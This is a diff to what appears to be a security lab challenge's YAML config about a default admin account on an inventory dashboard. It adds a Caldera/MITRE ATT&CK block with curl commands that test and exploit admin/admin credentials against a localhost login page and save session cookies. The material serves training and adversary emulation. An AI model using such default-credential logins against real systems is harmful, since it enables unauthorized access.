@@ -18,3 +18,18 @@ hints:
   - "Check the users table in the SQLite database at /opt/inventory/inventory.db"
   - "Use sqlite3 to update or delete the default admin account"
 suggested_fix: "sqlite3 /opt/inventory/inventory.db \"DELETE FROM users WHERE username = 'admin'\""
+caldera:
+  tactic: initial-access
+  technique:
+    attack_id: T1078.001
+    name: "Valid Accounts: Default Accounts"
+  recon:
+    description: "Check if default admin credentials exist on inventory dashboard"
+    command: |
+      curl -s -o /dev/null -w '%{http_code}' -X POST -d 'username=admin&password=admin' http://localhost:5001/login | grep -q '302' && echo "VULNERABLE: default credentials accepted" || echo "SECURE: default credentials rejected"
+  exploit:
+    description: "Authenticate with default admin credentials"
+    command: |
+      curl -s -c /tmp/cookies.txt -X POST -d 'username=admin&password=admin' http://localhost:5001/login && curl -s -b /tmp/cookies.txt http://localhost:5001/ | head -20
+    cleanup: |
+      rm -f /tmp/cookies.txt
